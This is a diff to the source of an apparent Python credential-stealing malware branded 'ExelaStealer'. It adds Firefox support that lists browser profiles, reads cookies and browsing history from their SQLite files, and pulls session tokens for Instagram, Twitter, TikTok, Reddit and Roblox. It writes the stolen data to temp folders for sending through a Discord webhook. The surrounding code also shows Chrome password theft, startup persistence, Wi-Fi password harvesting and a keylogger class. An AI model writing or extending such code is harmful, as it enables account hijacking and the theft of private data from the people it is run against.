@@ -21,6 +21,8 @@ class QuicaxdExela:
         self.hook = dhooks.Webhook(UrLxD,avatar_url="https://i.hizliresim.com/94iepii.jfif", username="quicaxd")
         self.local_app_data = os.getenv("LOCALAPPDATA")
         self.roaming_app_data = os.getenv('appdata')
+        self.MozillaPath = os.path.join(self.roaming_app_data, "Mozilla", "Firefox", "Profiles")
+        self.mozilla_profiles_full_path = list()
         self.login_data_path = ""
         self.backup_login_data_path = os.environ["temp"] + "\\login_data_copy.db"
         self.passw = []
@@ -28,6 +30,8 @@ class QuicaxdExela:
         self.ottomonCC = []
         self.sexDonwloads = []
         self.sexHistorys = []
+        self.mozilla_history = []
+        self.mozilla_cookie = []
         self.passws = 0
         self.cc = 0
         self.cookie = 0
@@ -51,11 +55,16 @@ class QuicaxdExela:
         self.robloxx = []
         self.growtopiaa = []        
         self.doitEveryProfile()
+        self.callMozilla()
         self.setSteam()
         self.setDiscord()
         self.writeAllData()
         self.sendxd()
         self.callMePls()
+    def callMozilla(self):
+        self.GetMozillaProfiles()
+        self.get_cookies_firefox()
+        self.get_historys_firefox()
     def callMePls(self):
         if wantS == "true":
             self.copyToStartup()
@@ -196,7 +205,7 @@ class QuicaxdExela:
                     shutil.copy2(self.login_data_path, self.backup_login_data_path)
                 except:
                     try:
-                        subprocess.run("taskkill /IM chrome.exe") # just chrome browser protect cookies, we need to close it
+                        #subprocess.run("taskkill /IM chrome.exe") # just chrome browser protect cookies, we need to close it
                         time.sleep(1.5)
                         shutil.copy2(self.login_data_path, self.backup_login_data_path)
                     except:
@@ -289,6 +298,46 @@ class QuicaxdExela:
                         self.sexHistorys.append(f"ID : {hstrys[0]} | URL : {hstrys[1]} | Title : {hstrys[2]} | Visit Count : {hstrys[3]} | Last Visit Time {hstrys[4]}")
         except:
             pass
+    def GetMozillaProfiles(self):
+        list_directory = os.listdir(self.MozillaPath)
+        for listed_dir in list_directory:
+            new_dir = os.path.join(self.MozillaPath, listed_dir)
+            self.mozilla_profiles_full_path.append(new_dir)
+    def get_cookies_firefox(self):
+        for file in self.mozilla_profiles_full_path:
+            history_path = os.path.join(file, "cookies.sqlite")
+            if not os.path.isfile(history_path):
+                continue
+            else:
+                try:
+                    conn = sqlite3.connect(history_path)
+                    cursor = conn.cursor()
+                    for cookie in cursor.execute("SELECT host,name, path, value, expiry FROM moz_cookies").fetchall():
+                        self.cookie+=1
+                        self.mozilla_cookie.append(f"{cookie[0]}\t{'FALSE' if cookie[4] == 0 else 'TRUE'}\t{cookie[2]}\t{'FALSE' if cookie[0].startswith('.') else 'TRUE'}\t{cookie[4]}\t{cookie[1]}\t{cookie[3]}")
+                        if "instagram" in str(cookie[0]).lower() and "sessionid" in str(cookie[1]).lower():
+                            self.setInstaSession(cookie[3], "Firefox")
+                        if "twitter" in str(cookie[0]).lower() and "auth_token" in str(cookie[1]).lower():
+                            self.setTwitterSession(cookie[3], "Firefox")
+                        if "tiktok" in str(cookie[0]).lower() and str(cookie[1]).lower() == "sessionid":
+                            self.setTiktokSession(cookie[3], "Firefox")
+                        if "reddit" in str(cookie[0]).lower() and "reddit_session" in str(cookie[1]).lower():
+                            self.setRedditSession(cookie[3], "Firefox")
+                        if "roblox" in str(cookie[0]).lower() and ".ROBLOSECURITY" in str(cookie[1]):
+                            self.setRoblox(cookie[0], "Firefox")
+                except Exception as e:
+                    print(str(e))
+    def get_historys_firefox(self):
+        for file in self.mozilla_profiles_full_path:
+            history_path = os.path.join(file, "places.sqlite")
+            if not os.path.isfile(history_path):
+                continue
+            else:
+                conn = sqlite3.connect(history_path)
+                cursor = conn.cursor()
+                for row in cursor.execute("SELECT id, url, title, visit_count, last_visit_date FROM moz_places;").fetchall():
+                    self.historys
+                    self.mozilla_history.append(f"ID : {row[0]} | URL : {row[1]} | Title : {row[2]} | Visit Count : {row[3]} | Last Visit Time {row[4]}")
     def setInstaSession(self, cookie, value):
         try:
             pp = "https://i.hizliresim.com/8po0puy.jfif"
@@ -900,6 +949,24 @@ class QuicaxdExela:
                     q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
                     for date in self.sexHistorys:
                         q.write(str(date) + "\n")
+            if self.mozilla_history:
+                try:
+                    os.mkdir(tmp + f"\\{run}\\Firefox")
+                except:
+                    pass
+                with open(tmp + f"\\{run}\\Firefox\\History.txt", "a", encoding="utf-8", errors="ingore") as q:
+                    q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
+                    for date in self.mozilla_history:
+                        q.write(str(date) + "\n")
+            if self.mozilla_cookie:
+                try:
+                    os.mkdir(tmp + f"\\{run}\\Firefox")
+                except:
+                    pass
+                with open(tmp + f"\\{run}\\Firefox\\Cookies.txt", "a", encoding="utf-8", errors="ingore") as q:
+                    q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
+                    for date in self.mozilla_cookie:
+                        q.write(str(date) + "\n")
             if not self.insta == 0:
                 os.mkdir(tmp + f"\\{run}\\Instagram")
                 with open(tmp + f"\\{run}\\Instagram\\instagram.txt", "a", encoding="utf-8", errors="ingore") as q:
@@ -1002,6 +1069,24 @@ class QuicaxdExela:
                     q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
                     for date in self.sexHistorys:
                         q.write(str(date) + "\n")
+            if self.mozilla_history:
+                try:
+                    os.mkdir(tmp + f"\\{run}\\Firefox")
+                except:
+                    pass
+                with open(tmp + f"\\{run}\\Firefox\\History.txt", "a", encoding="utf-8", errors="ingore") as q:
+                    q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
+                    for date in self.mozilla_history:
+                        q.write(str(date) + "\n")
+            if self.mozilla_cookie:
+                try:
+                    os.mkdir(tmp + f"\\{run}\\Firefox")
+                except:
+                    pass
+                with open(tmp + f"\\{run}\\Firefox\\Cookies.txt", "a", encoding="utf-8", errors="ingore") as q:
+                    q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
+                    for date in self.mozilla_cookie:
+                        q.write(str(date) + "\n")
             if not self.insta == 0:
                 os.mkdir(tmp + f"\\{run}\\Instagram")
                 with open(tmp + f"\\{run}\\Instagram\\instagram.txt", "a", encoding="utf-8", errors="ingore") as q:
@@ -1072,6 +1157,7 @@ class QuicaxdExela:
                 self.get_all_system_data()
             if 7855 < 8888:
                 self.GetWifiPasswords(tmp + f"\\{run}")
+
 class KeyboardLogger:
     def __init__(self, output_file, webhook_url) -> None:
         self.output_file = output_file
